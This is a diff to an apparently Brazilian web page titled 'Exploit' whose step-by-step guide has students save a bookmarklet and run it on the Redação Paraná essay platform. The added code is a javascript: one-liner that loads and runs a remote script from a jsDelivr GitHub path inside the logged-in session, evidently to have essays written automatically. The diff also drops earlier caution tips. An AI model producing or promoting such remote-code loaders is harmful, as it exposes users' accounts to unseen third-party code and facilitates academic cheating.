@@ -423,6 +423,78 @@
             font-size: 18px;
         }
 
+        /* Code Copy Section */
+        .code-section {
+            padding: 80px 0;
+            background: rgba(15, 23, 42, 0.5);
+            backdrop-filter: blur(10px);
+        }
+
+        .code-container {
+            max-width: 800px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .code-title {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: var(--text);
+        }
+
+        .code-subtitle {
+            font-size: 1.1rem;
+            color: var(--text-secondary);
+            margin-bottom: 30px;
+        }
+
+        .code-box {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: left;
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .code-content {
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            color: var(--text);
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin-bottom: 15px;
+            user-select: all;
+        }
+
+        .copy-btn {
+            background: var(--gradient-1);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 0 auto;
+        }
+
+        .copy-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(99, 102, 241, 0.4);
+        }
+
+        .copy-btn.copied {
+            background: var(--success);
+        }
+
         /* Guide Section */
         .guide-section {
             padding: 120px 0;
@@ -1117,8 +1189,8 @@
                     <span class="logo-text">Exploit</span>
                 </a>
                 <ul class="nav-links">
+                    <li><a href='#code'>Código</a></li>
                     <li><a href='#guide'>Guia</a></li>
-                    <li><a href="#gallery">Galeria</a></li>
                     <li><a href="https://chat.whatsapp.com/G5KZXq9yiclE8VHsF15eb8" target="_blank">Suporte</a></li>
                 </ul>
                 <button class="hamburger">
@@ -1145,7 +1217,7 @@
                 </p>
                 <div class="hero-stats">
                     <div class="stat">
-                        <span class="stat-number">9</span>
+                        <span class="stat-number">11</span>
                         <span class="stat-label">Passos</span>
                     </div>
                     <div class="stat">
@@ -1158,13 +1230,37 @@
                     </div>
                 </div>
                 <div class="cta-buttons">
-                    <a href="#guide" class="btn btn-primary btn-large">
+                    <a href="#code" class="btn btn-primary btn-large">
+                        <i class="fas fa-code"></i> Copiar Código
+                    </a>
+                    <a href="#guide" class="btn btn-secondary btn-large">
                         <i class="fas fa-play-circle"></i> Iniciar Guia
                     </a>
-                    <a href="https://chat.whatsapp.com/G5KZXq9yiclE8VHsF15eb8" target="_blank" class="btn btn-whatsapp">
-                        <i class="fab fa-whatsapp"></i> Suporte WhatsApp
-                    </a>
                 </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Code Section -->
+    <section class="code-section" id="code">
+        <div class="container">
+            <div class="code-container">
+                <h2 class="code-title">Primeiro Passo: Copie o Código</h2>
+                <p class="code-subtitle">Copie este código JavaScript para usar no guia a seguir</p>
+                
+                <div class="code-box">
+                    <div class="code-content" id="js-code">
+javascript:(function(){const s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/Hi55Five/Type@main/script.js?'+Date.now();document.head.appendChild(s);})();
+                    </div>
+                    <button class="copy-btn" id="copy-btn">
+                        <i class="fas fa-copy"></i> Copiar Código
+                    </button>
+                </div>
+                
+                <p class="code-subtitle">Após copiar o código, prossiga para o guia abaixo</p>
+                <a href="#guide" class="btn btn-primary">
+                    <i class="fas fa-arrow-down"></i> Continuar para o Guia
+                </a>
             </div>
         </div>
     </section>
@@ -1191,17 +1287,36 @@
                     </div>
                     
                     <div class="step-indicator">
-                        <div class="step-dot active">1</div>
+                        <div class="step-dot active">0</div>
+                        <div class="step-dot">1</div>
                         <div class="step-dot">2</div>
                         <div class="step-dot">3</div>
                         <div class="step-dot">4</div>
                         <div class="step-dot">5</div>
+                        <div class="step-dot">6</div>
+                        <div class="step-dot">7</div>
+                        <div class="step-dot">8</div>
+                        <div class="step-dot">9</div>
+                        <div class="step-dot">10</div>
                     </div>
                     
                     <div class="progress-bar">
                         <div class="progress" id="progressBar"></div>
                     </div>
                     
+                    <!-- Step 0 -->
+                    <div class="step">
+                        <span class="step-number">0</span>
+                        <div class="step-content">
+                            <p>Copie o código JavaScript que está na seção acima. Você vai precisar dele mais tarde.</p>
+                            <div class="info-box">
+                                <h4>Dica Importante</h4>
+                                <p>Certifique-se de copiar o código completo antes de prosseguir.</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Step 1 -->
                     <div class="step">
                         <span class="step-number">1</span>
                         <div class="step-content">
@@ -1219,146 +1334,174 @@
                         </div>
                     </div>
                     
+                    <!-- Step 2 -->
                     <div class="step">
                         <span class="step-number">2</span>
                         <div class="step-content">
-                            <p>Faça login na sua conta</p>
+                            <p>Entre na redação que quer que seja feita</p>
                             <div class="image-gallery">
                                 <div class="image-item">
-                                    <img src="imagens/2.png" alt="Tela de login do Redação Paraná" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                                    <img src="imagens/2.png" alt="Detalhes da redação" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
                                     <div class="placeholder-image" style="display:none;">
                                         <i class="fas fa-image fa-2x"></i>
-                                        <span>Tela de login do Redação Paraná</span>
+                                        <span>Detalhes da redação</span>
                                     </div>
-                                    <div class="image-caption">Tela de login do Redação Paraná</div>
+                                    <div class="image-caption">Detalhes da redação</div>
                                 </div>
                             </div>
                         </div>
                     </div>
                     
+                    <!-- Step 3 -->
                     <div class="step">
                         <span class="step-number">3</span>
                         <div class="step-content">
-                            <p>Clique com o botão direito do mouse e selecione "Inspecionar"</p>
+                            <p>Clique nos 3 pontinhos</p>
                             <div class="image-gallery">
                                 <div class="image-item">
-                                    <img src="imagens/3.png" alt="Menu de contexto com opção Inspecionar" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                                    <img src="imagens/3.png" alt="Menu de três pontos" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
                                     <div class="placeholder-image" style="display:none;">
                                         <i class="fas fa-image fa-2x"></i>
-                                        <span>Menu de contexto com opção Inspecionar</span>
+                                        <span>Menu de três pontos</span>
                                     </div>
-                                    <div class="image-caption">Menu de contexto com opção Inspecionar</div>
+                                    <div class="image-caption">Menu de três pontos</div>
                                 </div>
                             </div>
                         </div>
                     </div>
                     
+                    <!-- Step 4 -->
                     <div class="step">
                         <span class="step-number">4</span>
                         <div class="step-content">
-                            <p>Vá até a aba "Console"</p>
+                            <p>Clique na estrela</p>
                             <div class="image-gallery">
                                 <div class="image-item">
-                                    <img src="imagens/4.png" alt="Aba Console nas ferramentas do desenvolvedor" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                                    <img src="imagens/4.png" alt="Opção de favoritos" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
                                     <div class="placeholder-image" style="display:none;">
                                         <i class="fas fa-image fa-2x"></i>
-                                        <span>Aba Console nas ferramentas do desenvolvedor</span>
+                                        <span>Opção de favoritos</span>
                                     </div>
-                                    <div class="image-caption">Aba Console nas ferramentas do desenvolvedor</div>
+                                    <div class="image-caption">Opção de favoritos</div>
                                 </div>
                             </div>
                         </div>
                     </div>
                     
+                    <!-- Step 5 -->
                     <div class="step">
                         <span class="step-number">5</span>
                         <div class="step-content">
-                            <p>Cole o código do script no console e pressione Enter</p>
+                            <p>Clique nos 3 pontinhos de novo e vá em favoritos</p>
                             <div class="image-gallery">
                                 <div class="image-item">
-                                    <img src="imagens/5.png" alt="Console com código do script inserido" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                                    <img src="imagens/5.png" alt="Menu favoritos" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
                                     <div class="placeholder-image" style="display:none;">
                                         <i class="fas fa-image fa-2x"></i>
-                                        <span>Console com código do script inserido</span>
+                                        <span>Menu favoritos</span>
                                     </div>
-                                    <div class="image-caption">Console com código do script inserido</div>
+                                    <div class="image-caption">Menu favoritos</div>
                                 </div>
                             </div>
                         </div>
                     </div>
                     
+                    <!-- Step 6 -->
                     <div class="step">
                         <span class="step-number">6</span>
                         <div class="step-content">
-                            <p>Clique em "Iniciar Script"</p>
+                            <p>Vá até a guia que você favoritou e clique nos 3 pontinhos e editar</p>
                             <div class="image-gallery">
                                 <div class="image-item">
-                                    <img src="imagens/6.png" alt="Botão para iniciar o script" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                                    <img src="imagens/6.png" alt="Editor de favoritos" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
                                     <div class="placeholder-image" style="display:none;">
                                         <i class="fas fa-image fa-2x"></i>
-                                        <span>Botão para iniciar o script</span>
+                                        <span>Editor de favoritos</span>
                                     </div>
-                                    <div class="image-caption">Botão para iniciar o script</div>
+                                    <div class="image-caption">Editor de favoritos</div>
                                 </div>
                             </div>
                         </div>
                     </div>
                     
+                    <!-- Step 7 -->
                     <div class="step">
                         <span class="step-number">7</span>
                         <div class="step-content">
-                            <p>Selecione o tema da redação</p>
+                            <p>Edite o nome para "Script Redação" e na URL cole o código que copiou</p>
                             <div class="image-gallery">
                                 <div class="image-item">
-                                    <img src="imagens/7.png" alt="Seleção do tema da redação" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                                    <img src="imagens/7.png" alt="Editor de favoritos com código" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
                                     <div class="placeholder-image" style="display:none;">
                                         <i class="fas fa-image fa-2x"></i>
-                                        <span>Seleção do tema da redação</span>
+                                        <span>Editor de favoritos com código</span>
                                     </div>
-                                    <div class="image-caption">Seleção do tema da redação</div>
+                                    <div class="image-caption">Editor de favoritos com código</div>
                                 </div>
                             </div>
                         </div>
                     </div>
                     
+                    <!-- Step 8 -->
                     <div class="step">
                         <span class="step-number">8</span>
                         <div class="step-content">
-                            <p>Configure as opções do script</p>
+                            <p>Volte ao site e vá na barra de pesquisa</p>
                             <div class="image-gallery">
                                 <div class="image-item">
-                                    <img src="imagens/8.png" alt="Configurações do script" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                                    <img src="imagens/8.png" alt="Barra de pesquisa" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
                                     <div class="placeholder-image" style="display:none;">
                                         <i class="fas fa-image fa-2x"></i>
-                                        <span>Configurações do script</span>
+                                        <span>Barra de pesquisa</span>
                                     </div>
-                                    <div class="image-caption">Configurações do script</div>
+                                    <div class="image-caption">Barra de pesquisa</div>
                                 </div>
                             </div>
                         </div>
                     </div>
                     
+                    <!-- Step 9 -->
                     <div class="step">
                         <span class="step-number">9</span>
                         <div class="step-content">
-                            <p>Aguarde o script finalizar e verifique o resultado</p>
+                            <p>Digite "Script Redação"</p>
                             <div class="image-gallery">
                                 <div class="image-item">
-                                    <img src="imagens/9.png" alt="Script em execução" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                                    <img src="imagens/9.png" alt="Pesquisa por Script Redação" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
                                     <div class="placeholder-image" style="display:none;">
                                         <i class="fas fa-image fa-2x"></i>
-                                        <span>Script em execução</span>
+                                        <span>Pesquisa por Script Redação</span>
                                     </div>
-                                    <div class="image-caption">Script em execução</div>
+                                    <div class="image-caption">Pesquisa por Script Redação</div>
                                 </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Step 10 -->
+                    <div class="step">
+                        <span class="step-number">10</span>
+                        <div class="step-content">
+                            <p>Clique na que tem uma estrela do lado</p>
+                            <div class="image-gallery">
                                 <div class="image-item">
-                                    <img src="imagens/10.png" alt="Resultado final" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                                    <img src="imagens/10.png" alt="Resultado da pesquisa" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
                                     <div class="placeholder-image" style="display:none;">
                                         <i class="fas fa-image fa-2x"></i>
-                                        <span>Resultado final</span>
+                                        <span>Resultado da pesquisa</span>
                                     </div>
-                                    <div class="image-caption">Resultado final</div>
+                                    <div class="image-caption">Resultado da pesquisa</div>
                                 </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Step 11 -->
+                    <div class="step">
+                        <span class="step-number">11</span>
+                        <div class="step-content">
+                            <p>Seja feliz :D</p>
+                            <div class="image-gallery">
                                 <div class="image-item">
                                     <img src="imagens/11.png" alt="Redação concluída" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
                                     <div class="placeholder-image" style="display:none;">
@@ -1380,12 +1523,12 @@
                     </div>
                     
                     <div class="info-box">
-                        <h4>Dicas Importantes</h4>
+                        <h4>Informações Adicionais</h4>
                         <ul>
-                            <li>Certifique-se de que o script está atualizado</li>
-                            <li>Use apenas em ambientes de teste</li>
-                            <li>Não compartilhe informações pessoais</li>
-                            <li>Em caso de problemas, entre em contato com o suporte</li>
+                            <li>Token da proposta: <strong>B8658EDE-2</strong></li>
+                            <li>Gênero da redação: <strong>CARTA ABERTA</strong></li>
+                            <li>Tema: <strong>DOCUMENTO - ATA</strong></li>
+                            <li>Número de palavras: <strong>100 a 300</strong></li>
                         </ul>
                     </div>
                 </div>
@@ -1424,8 +1567,8 @@
                     <div class="link-group">
                         <h4>Recursos</h4>
                         <ul>
+                            <li><a href="#code">Código</a></li>
                             <li><a href="#guide">Guia</a></li>
-                            <li><a href="#gallery">Galeria</a></li>
                             <li><a href="https://chat.whatsapp.com/G5KZXq9yiclE8VHsF15eb8" target="_blank">Suporte</a></li>
                         </ul>
                     </div>
@@ -1540,16 +1683,37 @@
                 });
             });
 
-            // Theme toggle functionality
-            const themeToggle = document.getElementById('themeToggle');
-            if (themeToggle) {
-                themeToggle.addEventListener('click', function() {
-                    document.body.classList.toggle('light-theme');
-                    if (document.body.classList.contains('light-theme')) {
-                        themeToggle.innerHTML = '<i class="fas fa-moon"></i>';
-                    } else {
-                        themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
+            // Code copy functionality
+            const copyBtn = document.getElementById('copy-btn');
+            const jsCode = document.getElementById('js-code');
+            
+            if (copyBtn && jsCode) {
+                copyBtn.addEventListener('click', function() {
+                    // Select the text
+                    const range = document.createRange();
+                    range.selectNode(jsCode);
+                    window.getSelection().removeAllRanges();
+                    window.getSelection().addRange(range);
+                    
+                    // Copy the text
+                    try {
+                        const successful = document.execCommand('copy');
+                        if (successful) {
+                            copyBtn.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
+                            copyBtn.classList.add('copied');
+                            
+                            // Reset button after 2 seconds
+                            setTimeout(function() {
+                                copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copiar Código';
+                                copyBtn.classList.remove('copied');
+                            }, 2000);
+                        }
+                    } catch (err) {
+                        console.error('Falha ao copiar o código: ', err);
                     }
+                    
+                    // Deselect the text
+                    window.getSelection().removeAllRanges();
                 });
             }
 
